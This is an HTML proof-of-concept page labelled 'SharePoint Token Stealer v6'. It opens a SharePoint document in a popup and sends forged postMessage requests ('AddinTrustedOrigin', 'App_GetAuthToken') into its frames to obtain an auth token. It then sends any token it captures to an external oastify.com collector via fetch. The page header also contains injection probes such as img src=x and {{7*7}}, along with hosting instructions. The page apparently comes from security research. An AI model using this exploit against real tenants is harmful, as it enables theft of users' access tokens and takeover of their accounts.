<!DOCTYPE html>
<html>

    
<head><div></div><img src=x></div>
    <iframe src=x></iframe>
    {{7*7}}
    
    <title></h1><div></div><img src=x></div>SharePoint PoC - Token Stealer v6 {{7*7}}</title>
    <div></div><img src=x></div>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            padding: 20px;
            background: #f4f4f4;
        }

        .success {
            color: #155724;
            background-color: #d4edda;
            border-color: #c3e6cb;
            padding: 15px;
            border: 1px solid transparent;
            border-radius: 4px;
            font-weight: bold;
        }

        .error {
            color: #721c24;
            background-color: #f8d7da;
            border-color: #f5c6cb;
            padding: 10px;
            border: 1px solid transparent;
            border-radius: 4px;
        }

        .info {
            color: #004085;
            background-color: #cce5ff;
            border-color: #b8daff;
            padding: 10px;
            border: 1px solid transparent;
            border-radius: 4px;
        }

        #log {
            background: #1e1e1e;
            color: #d4d4d4;
            border: 1px solid #333;
            padding: 10px;
            height: 500px;
            overflow-y: scroll;
            font-family: 'Consolas', monospace;
            font-size: 13px;
            margin-top: 10px;
        }

        button {
            padding: 12px 24px;
            margin: 5px 0;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 3px;
        }

        button:hover {
            background-color: #005a9e;
        }

        .warning {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border: 1px solid #ffeeba;
            border-radius: 5px;
            margin-bottom: 20px;
        }
    </style>
</head>

<body>
    <h1>SharePoint Token Stealer - v6 (Corrected IDs)</h1>

    <div class="warning">
        <strong>CRITICAL REQUIREMENT:</strong> This PoC MUST be served via <code>HTTPS</code>.
        <br>
        1. Upload this file to <strong>GitHub Pages, Vercel, or Netlify</strong>.
        <br>
        2. OR run local text file via <code>ngrok http 80</code>.
    </div>

    <button onclick="startExploit()">ðŸš€ Launch Attack</button>
    <button onclick="stop()">Stop</button>

    <h3>Log:</h3>
    <div id="log"></div>

    <script>
        const targetUrl = "https://shiscolinotests-my.sharepoint.com/personal/shiscolino_shiscolinotests_onmicrosoft_com/_layouts/15/Doc.aspx?sourcedoc={aafd58b8-f1a2-439e-94f0-d4ac217eea09}&action=interactivepreview";
        const exploitId = "a1b2c3d4-e5f6-7890-a1b2-c3d4e5f67890";
        const attackerOastify = "https:/nb2ewtmnw5hum1j7sj5s6kqvgmmdafy4.oastify.com/";

        let popup = null;
        let intervals = [];

        function log(msg, type = "") {
            const div = document.getElementById("log");
            div.innerHTML = `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>` + div.innerHTML;
        }

        function startExploit() {
            log("Opening target...", "info");
            popup = window.open(targetUrl, "target", "width=1000,height=800");

            // Wait for boot (6s) then start
            setTimeout(() => {
                log("Starting Message Spray...", "info");
                startSpraying();
            }, 6000);
        }

        function stop() {
            intervals.forEach(clearInterval);
            intervals = [];
            log("Stopped.");
        }

        function startSpraying() {
            // CORRECTED MESSAGE IDs found in analysis
            const msgRegister = {
                MessageId: "AddinTrustedOrigin",
                AddinTrustId: exploitId
            };

            const msgRequest = {
                MessageId: "App_GetAuthToken", // WAS "GetAuthToken" -> FIXED TO "App_GetAuthToken"
                AddinTrustId: exploitId,
                Resource: window.location.origin,
                Values: {
                    AddinTrustId: exploitId,
                    Resource: window.location.origin
                }
            };

            const jsonRegister = JSON.stringify(msgRegister);
            const jsonRequest = JSON.stringify(msgRequest);

            // Spray Register constantly
            intervals.push(setInterval(() => {
                spray(jsonRegister);
            }, 1000));

            // Spray Request constantly (offset)
            setTimeout(() => {
                intervals.push(setInterval(() => {
                    spray(jsonRequest);
                }, 1000));
            }, 500);
        }

        function spray(payload) {
            if (!popup || popup.closed) return;

            try { popup.postMessage(payload, "*"); } catch (e) { }

            if (popup.frames.length > 0) {
                for (let i = 0; i < popup.frames.length; i++) {
                    try { popup.frames[i].postMessage(payload, "*"); } catch (e) { }
                    try {
                        for (let j = 0; j < popup.frames[i].frames.length; j++) {
                            popup.frames[i].frames[j].postMessage(payload, "*");
                        }
                    } catch (e) { }
                }
            }
        }

        window.addEventListener("message", (e) => {
            let data = e.data;
            if (typeof data === "object") {
                try { data = JSON.stringify(data); } catch (e) { }
            }
            if (typeof data !== "string") return;

            // FILTER NOISE (Metamask, React devtools, etc)
            if (data.includes("metamask") || data.includes("react-devtools")) return;
            // FILTER SELF
            if (data.includes("AddinTrustedOrigin") || data.includes("App_GetAuthToken")) return;

            // SUCCESS CHECK - Look for Token Response
            // Response ID is usually "Host_SetAuthToken" or just contains "Token"
            if (data.includes("Token") || data.includes("Host_SetAuthToken") || data.includes("AccessToken")) {

                // IGNORE "undefined" tokens or empty strings
                if (data.includes('"Token":""') || data.includes('"Token":null')) return;

                stop();
                log("!!! TOKEN RECEIVED !!! " + data.substring(0, 150) + "...", "success");
                alert("TOKEN STOLEN!");

                fetch(attackerOastify + "?stolen_data=" + encodeURIComponent(data), { mode: 'no-cors' });
            } else if (data.includes("accessDenied")) {
                log("Access Denied. HTTPS Check: " + window.location.protocol, "error");
            } else {
                // Keep log clean, only show relevant messages
                if (data.length < 500) log("RX: " + data);
            }
        });
    </script>
</body>

</html>
